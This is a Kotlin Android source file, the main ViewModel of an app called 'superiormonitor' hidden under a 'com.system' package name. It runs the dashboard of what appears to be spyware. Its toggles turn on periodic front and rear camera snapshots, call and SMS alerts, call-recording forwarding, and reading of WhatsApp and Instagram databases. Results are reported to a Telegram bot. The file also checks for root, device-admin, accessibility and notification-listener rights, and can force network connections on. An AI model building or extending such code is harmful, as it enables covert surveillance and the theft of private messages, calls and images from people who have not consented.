package com.system.superiormonitor.ui

import android.Manifest
import android.app.Application
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.receiver.MonitorDeviceAdminReceiver
import com.system.superiormonitor.service.MonitorAccessibilityService
import com.system.superiormonitor.util.LogManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

data class PermissionStatus(
    val hasRoot: Boolean = false,
    val hasDeviceAdmin: Boolean = false,
    val hasNotifListener: Boolean = false,
    val hasPostNotifs: Boolean = false,
    val hasAccessibility: Boolean = false,
    val hasSystemAlertWindow: Boolean = false,
    val hasIgnoreBattery: Boolean = false,
    val hasCallAccess: Boolean = false,
    val hasSmsAccess: Boolean = false,
    val hasContactsAccess: Boolean = false,
    val hasCameraAccess: Boolean = false,
    val hasMicrophoneAccess: Boolean = false,
    val isInternetConnected: Boolean = false,
    val hasWriteSettings: Boolean = false
) {
    val allPermissionsGranted: Boolean
        get() = hasRoot && hasDeviceAdmin && hasNotifListener && hasAccessibility && hasSystemAlertWindow && hasIgnoreBattery && hasCallAccess && hasSmsAccess && hasContactsAccess && hasMicrophoneAccess && hasWriteSettings && (hasCameraAccess || hasRoot)
}

data class DashboardUiState(
    val forceMobileData: Boolean = false,
    val forceWifi: Boolean = false,
    val forceHotspot: Boolean = false,
    val persistentEnforcementEnabled: Boolean = false,
    val showPersistentEnforcementDialog: Boolean = false,
    val enableSnapshots: Boolean = false,
    val snapshotIntervalMin: Int = 15,
    val enableFrontCamera: Boolean = false,
    val frontCameraIntervalMin: Int = 15,
    val enableRearCamera: Boolean = false,
    val rearCameraIntervalMin: Int = 15,
    val whatsappUpdatesEnabled: Boolean = false,
    val instagramUpdatesEnabled: Boolean = false,
    val callAlertsEnabled: Boolean = false,
    val smsAlertsEnabled: Boolean = false,
    val forwardRecordingEnabled: Boolean = false,
    val showWhatsAppWarningDialog: Boolean = false,
    val whatsAppWarningMessage: String = "",
    val showInstagramWarningDialog: Boolean = false,
    val instagramWarningMessage: String = ""
)

sealed class DashboardEvent {
    data class ToggleService(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceMobileData(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceWifi(val enabled: Boolean) : DashboardEvent()
    data class ToggleForceHotspot(val enabled: Boolean) : DashboardEvent()
    data class TogglePersistentEnforcement(val enabled: Boolean) : DashboardEvent()
    data class ShowPersistentEnforcementDialog(val show: Boolean) : DashboardEvent()
    data class ToggleSnapshots(val enabled: Boolean) : DashboardEvent()
    data class UpdateSnapshotInterval(val minutes: Int) : DashboardEvent()
    data class ToggleFrontCamera(val enabled: Boolean) : DashboardEvent()
    data class UpdateFrontCameraInterval(val minutes: Int) : DashboardEvent()
    data class ToggleRearCamera(val enabled: Boolean) : DashboardEvent()
    data class UpdateRearCameraInterval(val minutes: Int) : DashboardEvent()
    data class ToggleWhatsappUpdates(val enabled: Boolean) : DashboardEvent()
    data class ToggleInstagramUpdates(val enabled: Boolean) : DashboardEvent()
    data class ToggleCallAlerts(val enabled: Boolean) : DashboardEvent()
    data class ToggleSmsAlerts(val enabled: Boolean) : DashboardEvent()
    data class ToggleForwardRecording(val enabled: Boolean) : DashboardEvent()
    object DismissWhatsAppWarningDialog : DashboardEvent()
    object DismissInstagramWarningDialog : DashboardEvent()
}

/**
 * ViewModel for the main app screen. Owns all prefs-backed state and
 * exposes reactive LogManager flows for the UI to observe.
 */
class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val prefs = PrefsManager.getInstance(application)

    private val _isNetworkAvailable = MutableStateFlow(false)
    val isNetworkAvailable: StateFlow<Boolean> = _isNetworkAvailable.asStateFlow()

    private val _isDashboardScreenActive = MutableStateFlow(false)
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var prefListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null

    init {
        val cm = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        _isNetworkAvailable.value = cm.activeNetwork != null

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                _isNetworkAvailable.value = true
                if (_isDashboardScreenActive.value) {
                    checkTelegramConnection()
                }
            }
            override fun onLost(network: Network) {
                _isNetworkAvailable.value = false
                LogManager.setTelegramApiReachable(false)
            }
        }
        cm.registerDefaultNetworkCallback(networkCallback!!)
        
        prefListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, _ ->
            _dashboardState.update { 
                it.copy(
                    forceMobileData = prefs.forceMobileData,
                    forceWifi = prefs.forceWifi,
                    forceHotspot = prefs.forceHotspot,
                    persistentEnforcementEnabled = prefs.persistentEnforcementEnabled,
                    enableSnapshots = prefs.enableSnapshots,
                    snapshotIntervalMin = prefs.snapshotIntervalMin,
                    enableFrontCamera = prefs.enableFrontCamera,
                    frontCameraIntervalMin = prefs.frontCameraInterval,
                    enableRearCamera = prefs.enableRearCamera,
                    rearCameraIntervalMin = prefs.rearCameraInterval,
                    whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
                    instagramUpdatesEnabled = prefs.instagramEnabled,
                    callAlertsEnabled = prefs.callAlertsEnabled,
                    smsAlertsEnabled = prefs.smsAlertsEnabled,
                    forwardRecordingEnabled = prefs.forwardRecordingEnabled
                )
            }
        }
        prefs.sharedPreferences.registerOnSharedPreferenceChangeListener(prefListener)
    }

    override fun onCleared() {
        super.onCleared()
        networkCallback?.let {
            val cm = getApplication<Application>().getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.unregisterNetworkCallback(it)
        }
        prefListener?.let {
            prefs.sharedPreferences.unregisterOnSharedPreferenceChangeListener(it)
        }
    }

    fun setDashboardScreenActive(active: Boolean) {
        _isDashboardScreenActive.value = active
    }

    fun checkTelegramConnection() {
        if (LogManager.isServiceRunning.value) return // Service already handles reachability checks
        if (!_isNetworkAvailable.value) {
            LogManager.setTelegramApiReachable(false)
            return
        }
        val token = prefs.botToken
        if (token.isBlank()) {
            LogManager.setTelegramApiReachable(false)
            return
        }
        viewModelScope.launch(Dispatchers.IO) {
            val reachable = TelegramApi.isApiReachable(getApplication<Application>(), token)
            LogManager.setTelegramApiReachable(reachable)
        }
    }

    // ── Credential State ──
    var botToken by mutableStateOf(prefs.botToken)
    var chatId by mutableStateOf(prefs.chatId)
    var ownerUserId by mutableStateOf(prefs.ownerUserId)

    val hasCredentials: Boolean
        get() = botToken.trim().matches(Regex("^[0-9]+:[a-zA-Z0-9_-]+$")) && 
                chatId.trim().matches(Regex("^-?[0-9]+$")) && 
                ownerUserId.trim().matches(Regex("^[0-9]+$"))

    // ── Dashboard State ──
    private val _dashboardState = MutableStateFlow(
        DashboardUiState(
            forceMobileData = prefs.forceMobileData,
            forceWifi = prefs.forceWifi,
            forceHotspot = prefs.forceHotspot,
            persistentEnforcementEnabled = prefs.persistentEnforcementEnabled,
            enableSnapshots = prefs.enableSnapshots,
            snapshotIntervalMin = prefs.snapshotIntervalMin,
            enableFrontCamera = prefs.enableFrontCamera,
            frontCameraIntervalMin = prefs.frontCameraInterval,
            enableRearCamera = prefs.enableRearCamera,
            rearCameraIntervalMin = prefs.rearCameraInterval,
            whatsappUpdatesEnabled = prefs.whatsappUpdatesEnabled,
            instagramUpdatesEnabled = prefs.instagramEnabled,
            callAlertsEnabled = prefs.callAlertsEnabled,
            smsAlertsEnabled = prefs.smsAlertsEnabled,
            forwardRecordingEnabled = prefs.forwardRecordingEnabled
        )
    )
    val dashboardState: StateFlow<DashboardUiState> = _dashboardState.asStateFlow()

    // ── Permissions State ──
    private val _permissionStatus = MutableStateFlow(PermissionStatus())
    val permissionStatus: StateFlow<PermissionStatus> = _permissionStatus.asStateFlow()

    // ── Service/System Status (observed from LogManager) ──
    val isServiceRunning = LogManager.isServiceRunning
    val isTelegramApiReachable = LogManager.isTelegramApiReachable

    fun clearLogs(category: com.system.superiormonitor.util.LogCategory) {
        LogManager.clearLogs(category)
    }

    // ═══════════════════════════════════════════════════════════
    //  PERMISSIONS
    // ═══════════════════════════════════════════════════════════

    fun refreshPermissions() {
        viewModelScope.launch(Dispatchers.IO) {
            val context = getApplication<Application>()
            
            val hasRoot = checkRootAccess()
            
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminName = ComponentName(context, MonitorDeviceAdminReceiver::class.java)
            val hasDeviceAdmin = dpm.isAdminActive(adminName)

            val hasNotifListener = NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)

            val hasPostNotifs = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
            } else {
                true
            }

            var accessibilityEnabled = 0
            try {
                accessibilityEnabled = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
            } catch (e: Settings.SettingNotFoundException) { }

            val hasAccessibility = if (accessibilityEnabled == 1) {
                val settingValue = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                settingValue?.contains(context.packageName + "/" + MonitorAccessibilityService::class.java.name) == true
            } else false

            val hasSystemAlertWindow = Settings.canDrawOverlays(context)
            val hasIgnoreBattery = (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(context.packageName)

            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val isInternetConnected = cm.activeNetwork != null

            val hasCallAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

            val hasSmsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                           ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED

            val hasContactsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

            val isCameraGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
                              ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                              ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

            val hasMicrophoneAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

            val hasWriteSettings = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(context) else true

            _permissionStatus.value = PermissionStatus(
                hasRoot = hasRoot,
                hasDeviceAdmin = hasDeviceAdmin,
                hasNotifListener = hasNotifListener,
                hasPostNotifs = hasPostNotifs,
                hasAccessibility = hasAccessibility,
                hasSystemAlertWindow = hasSystemAlertWindow,
                hasIgnoreBattery = hasIgnoreBattery,
                hasCallAccess = hasCallAccess,
                hasSmsAccess = hasSmsAccess,
                hasContactsAccess = hasContactsAccess,
                hasCameraAccess = isCameraGranted,
                hasMicrophoneAccess = hasMicrophoneAccess,
                isInternetConnected = isInternetConnected,
                hasWriteSettings = hasWriteSettings
            )
        }
    }

    private fun checkRootAccess(): Boolean {
        try {
            val cached = com.topjohnwu.superuser.Shell.getCachedShell()
            if (cached != null && !cached.isRoot) {
                cached.close()
            }
            if (com.topjohnwu.superuser.Shell.getShell().isRoot) {
                return true
            }
        } catch (e: Exception) {
            // Ignore
        }
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            process.outputStream.close()
            process.waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  ACTIONS
    // ═══════════════════════════════════════════════════════════

    fun saveCredentials() {
        val token = botToken.trim()
        val chat = chatId.trim()
        val owner = ownerUserId.trim()
        
        prefs.botToken = token
        prefs.chatId = chat
        prefs.ownerUserId = owner
        
        botToken = token
        chatId = chat
        ownerUserId = owner
    }

    fun onDashboardEvent(event: DashboardEvent) {
        when (event) {
            is DashboardEvent.ToggleService -> setServiceEnabled(event.enabled)
            is DashboardEvent.ToggleForceMobileData -> {
                prefs.forceMobileData = event.enabled
                _dashboardState.update { it.copy(forceMobileData = event.enabled) }
            }
            is DashboardEvent.ToggleForceWifi -> {
                prefs.forceWifi = event.enabled
                _dashboardState.update { it.copy(forceWifi = event.enabled) }
            }
            is DashboardEvent.ToggleForceHotspot -> {
                prefs.forceHotspot = event.enabled
                _dashboardState.update { it.copy(forceHotspot = event.enabled) }
            }
            is DashboardEvent.TogglePersistentEnforcement -> {
                prefs.persistentEnforcementEnabled = event.enabled
                if (!event.enabled) {
                    prefs.forceMobileData = false
                    prefs.forceWifi = false
                    prefs.forceHotspot = false
                }
                _dashboardState.update { 
                    it.copy(
                        persistentEnforcementEnabled = event.enabled,
                        forceMobileData = if (!event.enabled) false else it.forceMobileData,
                        forceWifi = if (!event.enabled) false else it.forceWifi,
                        forceHotspot = if (!event.enabled) false else it.forceHotspot
                    ) 
                }
            }
            is DashboardEvent.ShowPersistentEnforcementDialog -> {
                _dashboardState.update { it.copy(showPersistentEnforcementDialog = event.show) }
            }
            is DashboardEvent.ToggleSnapshots -> {
                prefs.enableSnapshots = event.enabled
                _dashboardState.update { it.copy(enableSnapshots = event.enabled) }
            }
            is DashboardEvent.UpdateSnapshotInterval -> {
                prefs.snapshotIntervalMin = event.minutes
                _dashboardState.update { it.copy(snapshotIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleFrontCamera -> {
                prefs.enableFrontCamera = event.enabled
                _dashboardState.update { it.copy(enableFrontCamera = event.enabled) }
            }
            is DashboardEvent.UpdateFrontCameraInterval -> {
                prefs.frontCameraInterval = event.minutes
                _dashboardState.update { it.copy(frontCameraIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleRearCamera -> {
                prefs.enableRearCamera = event.enabled
                _dashboardState.update { it.copy(enableRearCamera = event.enabled) }
            }
            is DashboardEvent.UpdateRearCameraInterval -> {
                prefs.rearCameraInterval = event.minutes
                _dashboardState.update { it.copy(rearCameraIntervalMin = event.minutes) }
            }
            is DashboardEvent.ToggleWhatsappUpdates -> {
                if (event.enabled) {
                    // Validate WhatsApp availability before enabling
                    viewModelScope.launch(Dispatchers.IO) {
                        val context = getApplication<Application>()
                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context)) {
                            _dashboardState.update { it.copy(
                                showWhatsAppWarningDialog = true,
                                whatsAppWarningMessage = "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature."
                            ) }
                            return@launch
                        }
                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase()
                        if (!dbAvailable) {
                            _dashboardState.update { it.copy(
                                showWhatsAppWarningDialog = true,
                                whatsAppWarningMessage = dbReason
                            ) }
                            return@launch
                        }
                        // All checks passed — enable pref FIRST, then notify BotService
                        prefs.whatsappUpdatesEnabled = true
                        _dashboardState.update { it.copy(whatsappUpdatesEnabled = true) }
                        // Now safe to notify BotService (pref is already set)
                        notifyBotService(context, "ACTION_UPDATE_WHATSAPP")
                    }
                } else {
                    prefs.whatsappUpdatesEnabled = false
                    _dashboardState.update { it.copy(whatsappUpdatesEnabled = false) }
                    notifyBotService(getApplication(), "ACTION_UPDATE_WHATSAPP")
                }
            }
            is DashboardEvent.DismissWhatsAppWarningDialog -> {
                _dashboardState.update { it.copy(showWhatsAppWarningDialog = false, whatsAppWarningMessage = "") }
            }
            is DashboardEvent.ToggleInstagramUpdates -> {
                if (event.enabled) {
                    viewModelScope.launch(Dispatchers.IO) {
                        val context = getApplication<Application>()
                        if (!com.system.superiormonitor.monitor.InstagramMonitor.isInstagramInstalled(context)) {
                            _dashboardState.update { it.copy(
                                showInstagramWarningDialog = true,
                                instagramWarningMessage = "Instagram is not installed on this device. Please install Instagram before enabling this feature."
                            ) }
                            return@launch
                        }
                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.InstagramMonitor.checkInstagramDatabase()
                        if (!dbAvailable) {
                            _dashboardState.update { it.copy(
                                showInstagramWarningDialog = true,
                                instagramWarningMessage = dbReason
                            ) }
                            return@launch
                        }
                        prefs.instagramEnabled = true
                        _dashboardState.update { it.copy(instagramUpdatesEnabled = true) }
                        notifyBotService(context, "ACTION_UPDATE_INSTAGRAM")
                    }
                } else {
                    prefs.instagramEnabled = false
                    _dashboardState.update { it.copy(instagramUpdatesEnabled = false) }
                    notifyBotService(getApplication(), "ACTION_UPDATE_INSTAGRAM")
                }
            }
            is DashboardEvent.DismissInstagramWarningDialog -> {
                _dashboardState.update { it.copy(showInstagramWarningDialog = false, instagramWarningMessage = "") }
            }
            is DashboardEvent.ToggleCallAlerts -> {
                prefs.callAlertsEnabled = event.enabled
                _dashboardState.update { it.copy(callAlertsEnabled = event.enabled) }
            }
            is DashboardEvent.ToggleSmsAlerts -> {
                prefs.smsAlertsEnabled = event.enabled
                _dashboardState.update { it.copy(smsAlertsEnabled = event.enabled) }
            }
            is DashboardEvent.ToggleForwardRecording -> {
                prefs.forwardRecordingEnabled = event.enabled
                _dashboardState.update { it.copy(forwardRecordingEnabled = event.enabled) }
            }
        }
    }

    fun disableAllFeatures() {
        prefs.isServiceEnabled = false
        prefs.forceMobileData = false
        prefs.forceWifi = false
        prefs.forceHotspot = false
        prefs.persistentEnforcementEnabled = false
        prefs.enableSnapshots = false
        prefs.enableFrontCamera = false
        prefs.enableRearCamera = false
        prefs.whatsappUpdatesEnabled = false
        prefs.instagramEnabled = false
        prefs.callAlertsEnabled = false
        prefs.smsAlertsEnabled = false
        prefs.forwardRecordingEnabled = false

        _dashboardState.update { 
            it.copy(
                forceMobileData = false,
                forceWifi = false,
                forceHotspot = false,
                persistentEnforcementEnabled = false,
                showPersistentEnforcementDialog = false,
                enableSnapshots = false,
                enableFrontCamera = false,
                enableRearCamera = false,
                whatsappUpdatesEnabled = false,
                instagramUpdatesEnabled = false,
                callAlertsEnabled = false,
                smsAlertsEnabled = false,
                forwardRecordingEnabled = false
            )
        }
    }

    private fun notifyBotService(context: Context, action: String) {
        if (LogManager.isServiceRunning.value) {
            val intent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
                this.action = action
            }
            context.startForegroundService(intent)
        }
    }

    private fun setServiceEnabled(enabled: Boolean) {
        prefs.isServiceEnabled = enabled
    }
}
